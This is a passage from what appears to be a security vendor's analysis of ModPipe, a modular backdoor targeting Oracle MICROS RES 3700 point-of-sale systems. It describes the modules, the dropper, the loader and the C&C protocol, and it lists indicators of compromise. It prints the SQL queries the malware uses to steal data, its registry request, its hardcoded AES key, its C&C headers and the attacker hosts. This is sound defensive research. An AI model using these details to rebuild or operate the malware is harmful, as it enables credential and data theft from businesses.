One of them named\nGetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry\nvalues. This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this\nsophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging.\n\nExfiltrated credentials allow ModPipe’s operators access to database contents, including various definitions and\nconfiguration, status tables and information about POS transactions.\n\nHowever, based on the documentation of RES 3700 POS, the attackers should not be able to access some of the most\nsensitive information – such as credit card numbers and expiration dates – which is protected by encryption. The only\ncustomer data stored in the clear and thus available to the attackers should be cardholder names.\n\nThis would limit the amount of valuable information viable for further sale or misuse, making the full “business model”\nbehind the operation unclear. One possible explanation is that another downloadable module exists that allows the\nmalware operators to decrypt the more sensitive data in the user’s database.\n\nAccording to the documentation, to achieve this the attackers would have to reverse engineer the generation process of\nthe “site-specific passphrase”, which is used to derive the encryption key for sensitive data. This process would then have\nto be implemented into the module and – due to use of the Windows Data Protection API (DPAPI) – executed directly on\nthe victim’s machine. Another remaining unknown is ModPipe’s distribution method. The majority of the identified targets\nwere from the United States, with indications that they were in the restaurant and hospitality sectors – the primary\ncustomers of RES 3700 POS.\n\n## ModPipe architecture\n\nOur analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules\n(for a better overview see Figure 1):\n\n1. initial dropper – contains both 32-bit and 64-bit binaries of the next stage – the persistent loader – and installs the\n\nappropriate version to the compromised machine.\n2. persistent loader – unpacks and loads the next stage of the malware, namely the main module.\n3. main module – performs the main functionality of the malware. It creates a pipe used for communication with other\n\nmalicious modules, un/installs these modules and serves as a dispatcher that handles communication between the\nmodules and attacker’s [C&C server.](https://www.virusradar.com/en/glossary/command-and-control-server)\n4. networking module – module used for communication with C&C.\n5. downloadable modules – components adding specific functionality to the backdoor, such as the ability to steal\n\ndatabase passwords and configuration information, scan specific IP addresses or acquire a list of the running\nprocesses and their loaded modules.\n\n\n-----\n\n_Figure 1. Overview of ModPipe backdoor architecture_\n\n### Downloadable modules\n\nProbably the most intriguing parts of ModPipe are its downloadable modules. We’ve been aware of their existence since\nthe end of 2019, when we first found and analyzed its “basic” components.\n\nIn April 2020, after a couple of months of hunting, we found three of these modules in the wild. The list of all downloadable\nmodules we found and analyzed, and their IDs – represented by a 16-bit unsigned value – are available in Table 1. Our\nresearch also suggests that the operators use at least four other downloadable modules, whose functionality remains\ncompletely unknown to us for now.\n\nIt’s worth mentioning that some of these modules can create a named pipe with a GUID-formatted name derived from the\nmodule’s ID. Other modules can use this pipe to send commands to the module that created it.\n\n_Table 1. Downloadable modules_\n\n**Module ID** **Name** **Description**\n\n0xA0C0 GetMicInfo Steals database passwords, data and various settings\n\n0x2000 ModScan Performs scan on the specified IP addresses\n\n - ProcList Gets list of the running processes and their loaded modules\n\n\n-----\n\n**Module ID** **Name** **Description**\n\n0xA000 unknown \n0xA040 unknown \n0xA740 unknown \n0xA080 unknown \n**Downloadable module: GetMicInfo**\n\nGetMicInfo is a downloadable component that targets data related to the MICROS POS including passwords tied to two\ndatabase usernames predefined by the manufacturer: dba and micros (see Figure 2). This information is encrypted and\nstored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys:\n\nHKLM\\Software\\Micros\\UserData or\nHKLM\\Software\\WOW6432Node\\Micros\\UserData if run in Windows 32-bit on Windows 64-bit (WOW64) subsystem\n\n_Figure 2. Hex-Rays decompiled code of the function stealing database passwords_\n\nThe GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm. So\nas not to aid other malicious actors, we won’t be disclosing the inner workings of the algorithm. Since the decryption\nmechanism wasn’t publicly available, there are at least three possible scenarios of how the attackers could have created\nthe algorithm:\n\nThe most probable option is that the attackers acquired and reverse engineered the implementation of the\n**ORACLE MICROS RES 3700** **POS and the libraries responsible for encryption and decryption of the database**\npasswords.\nThe attackers could have gained the information describing the implementation of the encryption and decryption\n[mechanism from a 2016 data breach, first reported by security journalist Brian Krebs.](https://krebsonsecurity.com/2016/08/data-breach-at-oracles-micros-point-of-sale-division/)\nThe malware operators could have bought the code from an underground market.\n\nOur analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try\nto acquire the path to the SQL Anywhere API library from the environment variable “SQLANY_API_DLL” and load it if it’s\navailable.\n\nIf the environment variable does not exist, the module tries to load the library using its name dbcapi.dll. This library is a\npart of Sybase SQL Anywhere, which is used by RES 3700 POS.\n\nIf one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection\nstring:\n\nDBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted DataS5%\n\n\n-----\n\n%PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands\nfor the decrypted dba user password.\n\nAfter establishing a connection, GetMicInfo tries to execute the following SQL queries and report the results to the main\nmodule, using a pipe message with ID 0x10000013 (see Table 3 for a full list of pipe messages and their IDs):\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nSELECT lan_node_seq,obj_num,name,lan_addr,ob_diskless,type,ip_addr,ip_netmask FROM micros.lan_node_def\n\nSELECT\ndvc_tbl_seq,obj_num,name,type,com_port_seq,com_port,baud_rate,num_data_bits,num_stop_bits,parity_type,filename\nFROM micros.dev_def\n\nSELECT tmed_seq,obj_num,name,type,ca_driver,edc_driver FROM micros.tmed_def\n\nSELECT * FROM micros.caedc_driver_def\n\nSELECT * FROM micros.interface_def\n\n\nQueried data contain various MICROS RES 3700 POS system definitions and configurations (see Figure 3). Other\ninformation stolen by the module includes the version of the MICROS POS and information about specific registry keys\nmost likely related to various credit card services configurations.\n\n_Figure 3. Hex-Rays decompiled code of the function that steals database data_\n\n\n-----\n\nThe GetMicInfo module is injected into one of the processes specified by the C&C in the install command (0x0C). Based\non our findings, it is typically associated with one of the following legitimate processes:\n\nMDSHTTPService.exe (MICROS MDS HTTP Service)\nCALSrv.exe (MICROS CAL Service – Client Application Loader server)\nexplorer.exe\n\nWe can confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7\nand v5.4. For all the other versions, we were neither able to confirm nor deny the ability of the component to obtain the\ntargeted libraries.\n\n**Downloadable module: ModScan 2.20**\n\nThe main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on\nthe machines by scanning selected IP addresses. The ModScan 2.20 module is injected into one of the processes\nspecified by the C&C via an InstallMod command (0x72). Based on our findings, it is typically associated with one of the\nfollowing legitimate processes:\n\nMDSHTTPService.exe (MICROS MDS HTTP Service)\nCALSrv.exe (MICROS CAL Service – Client Application Loader server)\nmsdtc.exe\njusched.exe\nspoolsv.exe\nservices.exe\n\nDifferences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused\nby the fact that GetMicInfo module is injected only into processes running under WOW64.\n\nThe list of IP addresses intended for scanning and the special “ping” IP address are specified by the C&C in one of two\nways. It is either:\n\n1. downloaded from the C&C along with the ModScan module, or\n2. received during runtime, using the named pipe associated with the ModScan module.\n\nThe ModScan module handles pipe commands listed in Table 2.\n\n_Table 2. ModScan 2.20 module pipe commands_\n\n**Command**\n**name** **Command description**\n\nexit Exit\n\nstop Terminate scanning threads\n\nscan Start scanning IPs specified in the command data to collect additional information about the\nenvironment\n\nprm Specify special “ping” IP address\n\n**Scanning procedure routine**\n\n1. Before scanning, the module sends a special “ping” message containing a 32-bit value generated by the\n\nGetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP\nSybase database server) of the “ping” IP address.\n2. The response from the “ping” IP address should contain the same 32-bit value rotated right by one bit and XORed\n\nwith the value 0x6CF6B8A8. If the response on at least one of the ports provides the appropriate value, the module\nwill start the scan of the selected IP addresses. A decompilation of this ping function is shown in Figure 4.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\n_Figure 4. Hex-Rays decompiled code of the ModScan ping functionality_\n\n1. When the ModScan module starts the scan, some of the following information may be gathered, depending on the\n\nparameters received along with the scan command:\n\n**Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure**\n5) to the specified IP address on port 50123 used by the MDS HTTP Service. The sought-after information is stored\nbetween data xml tags (<data>%version%</data>) of the response from the service.\n\nPOST /%s HTTP/1.1\n\nAccept: text/xml\n\nUser-Agent: MDS POS Client\n\nHost: %s:50123\n\nContent-Length: 459\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n\n<SOAP-ENV:Body xmlns:MCRS-ENV=\"MCRS-URI\">\n\n<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service>\n\n<MCRS-ENV:Method>Reg_GetValue</MCRS-ENV:Method>\n\n<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey>\n\n<MCRS-ENV:InputParameters>\n\n<Key>SOFTWARE\\MICROS</Key>\n\n<KeyType>HKEY_LOCAL_MACHINE</KeyType>\n\n<KeyName>Version</KeyName>\n\n</MCRS-ENV:InputParameters>\n\n</SOAP-ENV:Body>\n\n</SOAP-ENV:Envelope>\n\n\n_Figure 5. MDS HTTP Service request_\n\n\n-----\n\n**Name of the database, extracted by sending a specially crafted TCP packet (possibly using the CMDSEQ**\ncommand protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server. The string\nrepresenting the name of the database is located at offset 0x28 of the response sent by the database server.\n**Database server** **data, such as its name, version of the TDS protocol and the TDS server version. To gain this**\n[information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP](http://www.freetds.org/tds.html#login)\n[address on port 2638. The response includes a Login Acknowledgement packet which, in both cases – success and](http://www.freetds.org/tds.html#t173)\nfailure – contains information about the database server and the TDS versions used. The TDS login packet is\nhardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default\npassword in some RES 3700 POS versions. As we haven’t found any public reference to this password, we won’t be\npublishing it in our blogpost.\n\n_Figure 6. TDS 4.2 & 5.0 Login Packet used by the ModScan module, dissected using Wireshark_\n\n**Downloadable module: ProcList**\n\nThe last of the downloadable modules we were able to obtain and dissect was ProcList. This is a lightweight module that\ndoesn’t have an assigned ID. Its main purpose is to collect information about currently running processes, including: name,\nprocess identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and\ncommand line.\n\nOptionally, ProcList can also collect information about loaded modules for each of the running processes. Collected\ninformation is sent to the main module of the backdoor (using pipe message 0x10000013).\n\n### Initial dropper\n\nThe initial dropper is responsible for installing the next stage of the malware. During our investigation, we discovered one\ndropper executable on two compromised machines, stored in the following locations:\n\nC:\\IQXDatabase\\Live\\1.exe\nC:\\OasisLive\\1.exe\n\nEach time the initial dropper is executed, a unique configuration is generated, using mostly random bytes. This causes the\nhash of the dropped loader to change with each execution, complicating detection and tracking of the malware. The\ndropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a\nWindows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section).\n\nThe encrypted payload, containing the main functionality of the dropper, is stored in the dropper’s resources as bitmaps\nnamed from A to L. The dropper decrypts this payload using the provided command line parameter, then executes it. The\npayload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64\n\n-----\n\nbit. Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long. Decompiled code responsible for\nloading the payload from the binary’s resources, its decryption and execution is shown in Figure 7.\n\n\n-----\n\n_Figure 7. Hex-Rays decompiled code – decryption and execution of the payload in the initial dropper_\n\nAn example of an encrypted and decrypted configuration with explanations is visible in Figure 8. The configuration shown\ncomes from the loader installed by the dropper sample with SHA-1 hash 9f8530627a8ad38f47102f626dec9f0173b44cd5.\nNote that the structure of the configuration can vary between older and newer versions of the loader executable.\n\n_Figure 8. Example of the loader’s generated configuration (upper is encrypted, lower decrypted)_\n\n\n-----\n\n### Persistent loader\n\nThis component is responsible for both unpacking the main module and for its injection into one of the following processes:\n\nlsass.exe\nwininit.exe\nservices.exe\n\nTo unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions. While the\n32-bit loader is almost identical to the initial dropper – the only difference being the payloads stored in the resources – the\n64-bit loader uses completely different “unpacking” code.\n\nWe have found seven different versions of the loader executables, each having a different compilation timestamp, with the\noldest one probably originating in December 2017 and the latest in June 2020. For the full timeline, see Figure 9. A list of\nall the loader hashes is included in the Indicators of Compromise section.\n\n_Figure 9. Timeline of known ModPipe variants and their timestamps._\n\n### Main module\n\nThe main module is mostly responsible for managing C&C communication and for handling received\nmessages/commands, either from C&C or downloadable modules. To facilitate the communication with modules, the main\nmodule starts by creating a pipe with a randomly generated name formatted using the following format string:\n\n\n-----\n\n{%08X %04X %04X %04X %08X%04X}\n\nIt then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function. Messages are\nparsed and handled according to their content. For a full list of recognized pipe commands and messages see Table 3.\n\n_Table 3. List of pipe message/command types_\n\n**Message**\n**code** **Description**\n\n0x10000012 inject and execute received module in specified process\n\n0x10000013 data for C&C server (execution logs, stolen data, …)\n\n0x10000014 write requested configuration data to the file handle received in this message (most likely handle to\nnamed pipe created by some other module) (main config, network config, loader name, main module\nPID, ...)\n\n0x10000020 C&C commands (not encrypted) – see Table 4 for the full list of available commands\n\n0x10000022 set module status (or err code)\n\n0x10000023 set C&C communication time intervals\n\n0x10000024 close received list of handles\n\n0x10000025 get handle of the process with specified PID, duplicate it for some other specified process and send it\nthrough the received named pipe handle\n\n0x10000072 C&C commands (encrypted) – see Table 4 for the full list of available commands\n\nFor the detailed structure and format used for the messages transferred through the pipe refer to Figure 10.\n\n_Figure 10. Structure of the main module’s named pipe messages_\n\nFor communication with its C&C server, the main module uses HTTP and port 80. Each of the dissected samples\ncontained a list of potentially available servers from which one was randomly chosen. A list of all C&C addresses\ndiscovered over the course of our research is available in the Indicators of Compromise section.\n\nMessages sent to the C&C (see Figure 11) are constructed and encrypted within the main module’s code.\n\n\n-----\n\n_Figure 11. Structure of the messages sent to the C&C_\n\nBefore any communication with the C&C, the main module generates two clean URLs and uses them to check for an\ninternet connection and a clean-looking cover for the malicious traffic. The URLs use the following format: www.%domain%\n\n[.]com/?%rand%, where %domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32-bit\nunsigned integer represented in ASCII.\n\nCommunication with the C&C is encrypted using AES in CBC mode with the following 128-bit key:\nF45D076FEC641691A21F0C946EDA9BD5. Before encryption, C&C messages start with a 4-byte checksum, which is\ncalculated as CRC32 (message) XORed with the first 4 bytes of the AES key used to encrypt the message. In the case of\nthe key mentioned above, this would be F4 5D 07 6F.\n\nThe data is transmitted using the lightweight networking module, which is injected on demand and exits immediately after\nuploading or downloading the requested message. To select the process for injection, the main module enumerates\nrunning processes and assigns them a priority value between 3 and 6. Those with higher priority are injected first, based\non the following criteria:\n\nPriority 6\n\nThe highest priority, assigned to any process that has already been used successfully to inject a networking\nmodule, received a response from the C&C and that is still running under the same PID, name and\nCreationTime.\n\n\n-----\n\nPriority 5\n\nProcess name with no extension that matches one of the following process names used for browsers: iexplore,\nopera, chrome, firefox\nPriority 4\n\nProcess name with no extension that matches the following process names: explorer, svchost\nPriority 3\n\nAll the other running processes excluding the following system processes: system, lsass, csrss, lsm, winlogon,\nsmss, wininit\n\nThe main reason behind the priority list is to inject processes that are expected to communicate over the network and at\nthe same time avoid system processes that might attract attention if caught communicating over the network.\n\n### Networking module\n\nThis ModPipe module is responsible for sending requests to the C&C and parsing the payload received in the C&C\nresponses. HTTP POST or GET methods with headers shown in Figure 12 and Figure 13 can be used to upload data to\nthe C&C and download additional payloads and C&C commands.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nPOST /robots.txt HTTP/1.1\n\nAccept: */*\n\nContent-Length: %data_length%\n\nContent-Type: application/octet-stream\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)\n\nHost: %remote_host%\n\nCache-Control: no-cache\n\n%data%\n\n\n_Figure 12.

HTTP GET message header_\n\nResponses from the C&C server have to be at least 33-bytes long in order to be parsed by the networking module and the\nmalicious payload is located after a sequence of 13 spaces followed by an HTML comment opening tag. An example of a\nserver response including this sequence is shown in Figure 14.\n\n\n-----\n\n_Figure 14. Example C&C server response including encrypted payload_\n\nIf all conditions are met, the network module sends the C&C response to the main module using a pipe message with ID\n0x10000072. The main module then decrypts the payload, verifies its checksum and executes the C&C command.\nAvailable commands are listed in Table 4.\n\n_Table 4.

Probably the most intriguing finding is the algorithm hidden in one of the\nbackdoor’s modules, which was specifically designed to steal credentials by decrypting them from registry values. By\nacquiring the database passwords, the attackers gain broad access to sensitive information even though the most\nsensitive data stored in devices running RES 3700 POS should still be protected by encryption.\n\nModPipe’s architecture, modules and their capabilities also indicate that its writers have extensive knowledge of the\ntargeted RES 3700 POS software. The proficiency of the operators could stem from multiple scenarios, including stealing\nand reverse engineering the proprietary software product, misusing its leaked parts or buying code from an underground\nmarket.\n\nTo keep the operators behind ModPipe at bay, potential victims in the hospitality sector as well as any other businesses\nusing the RES 3700 POS are advised to:\n\nUse the latest version of the software.\nUse it on devices that run updated operating system and software.\nUse reliable multi-layered security software that can detect ModPipe and similar threats.\n\n## Indicators of Compromise\n\n### C&C IP addresses\n\n191.101.31[.]223\n194.32.76[.]192\n23.19.58[.]114\n88.99.177[.]103\n91.209.77[.]172\n5.135.230[.]136\n\n### C&C domains/URLs\n\nsubzeroday.zapto[.]org\nshj145ertyb.ddns[.]net/gettime.html\nouidji12345.ddns[.]net/gettime.html\n\n### Dropper samples\n\n9F8530627A8AD38F47102F626DEC9F0173B44CD5\nFEE9C08B494C80DBF73A6F70FACD20ED0429330D\n\n### Loader samples\n\n0D1A4CB620576B8ADD34F919B4C6C46E7C3F9A59\nB47E05D67DC055AF5B0689782D67EAA2EB8C75E3\nF213B4EEF63F06EC127D3DC3265E14EE190B71E5\nB2CE307DFE65C188FDAE169ABD65B75B112522C4\n2AC7A2C09E50EAFABF1F401194AC487ED96C6781\n0F4355A17AABD3645788341EAC2A9BB759DB95EE\n\n### File paths\n\n%CSIDL_APPDATA%\\Microsoft\\Windows\\{%rand_guid%}\\explorer.exe\n%WINDIR%\\system32\\%random_name%.exe\n\n%rand_guid% – pseudo-random GUID formatted string\n\n%random_name% – from 4 to 7 pseudo-random letters (a-z) with the first one capital e.g. “Cvoeqo.exe”\n\n## MITRE ATT&CK techniques\n\n_[Note: This table was built using version 7 of the MITRE ATT&CK framework.](https://attack.mitre.org/versions/v7/)_\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\n\nExecution [T1059.003](https://attack.mitre.org/versions/v7/techniques/T1059/003/) Command and Scripting Interpreter:\nWindows Command Shell\n\nPersistence [T1547.001](https://attack.mitre.org/versions/v7/techniques/T1547/001/) Boot or Logon Autostart Execution:\nRegistry Run Keys / Startup Folder\n\n\n[T1543.003](https://attack.mitre.org/versions/v7/techniques/T1543/003/) Create or\nModify\nSystem\nProcess:\nWindows\nService\n\n\nModPipe can create a new service for\npersistence.\n\n\nPrivilege\nEscalation\n\nDefense\nEvasion\n\n\n[T1134.001](https://attack.mitre.org/versions/v7/techniques/T1134/001/) Access Token Manipulation: Token\nImpersonation/Theft\n\n[T1055.002](https://attack.mitre.org/versions/v7/techniques/T1055/002/) Process Injection: Portable Executable\nInjection\n\n\n[T1205](https://attack.mitre.org/versions/v7/techniques/T1205/) Traffic\nSignaling\n\n\nModPipe’s ModScan module sends\nrandom 32-bit values to TCP ports 50123\nand 2638 of the specified IP address and\nrequires a specific response in order to\ncontinue executing its scan functionality.\n\n\nAttackers were seen using Windows\nCommand Shell to execute the initial dropper.\n\nModPipe can use Registry Run key for\npersistence.\n\nAttackers were seen using partially modified\n[PrintSpoofer tool to drop and subsequently](https://github.com/itm4n/PrintSpoofer)\nexecute loader with SYSTEM privileges.\n\nModPipe can inject it’s modules into various\nprocesses.\n\nModPipe’s GetMicInfo module retrieves\nencrypted database passwords for ORACLE\nMICROS RES 3700 POS software from\nWindows Registry and uses a custom\nalgorithm to decrypt them before uploading to\nthe C&C.\n\n\nCredential\nAccess\n\n\n[T1552.002](https://attack.mitre.org/versions/v7/techniques/T1552/002/) Unsecured Credentials: Credentials in\nRegistry\n\n\nDiscovery [T1057](https://attack.mitre.org/versions/v7/techniques/T1057/) Process Discovery ModPipe’s ProcList module can get\ninformation about processes running on a\nsystem.\n\n\n[T1012](https://attack.mitre.org/versions/v7/techniques/T1012/) Query\nRegistry\n\n[T1033](https://attack.mitre.org/versions/v7/techniques/T1033/) System\nOwner/User\nDiscovery\n\n\nModPipe’s GetMicInfo module queries\nthe Registry for ORACLE MICROS RES\n3700 POS version, database passwords\nand other configuration data.\n\nModPipe gathers username and\ncomputer name from victim machines\nand reports them to the C&C in initial\nmessage.\n\n\nCommand\nand Control\n\n\n[T1071.001](https://attack.mitre.org/versions/v7/techniques/T1071/001/) Application Layer Protocol: Web\nProtocols\n\n\nModPipe uses HTTP for command and\ncontrol.\n\n\n[T1573.001](https://attack.mitre.org/versions/v7/techniques/T1573/001/) Encrypted\nChannel:\nSymmetric\nCryptography\n\n\nModPipe encrypts communication with\nC&C using AES in CBC mode.\n\n\nExfiltration [T1041](https://attack.mitre.org/versions/v7/techniques/T1041/) Exfiltration Over C2 Channel ModPipe exfiltrates data over its C&C\nchannel.\n\n\n[T1029](https://attack.mitre.org/versions/v7/techniques/T1029/) Scheduled\nTransfer\n\n12 Nov 2020 -
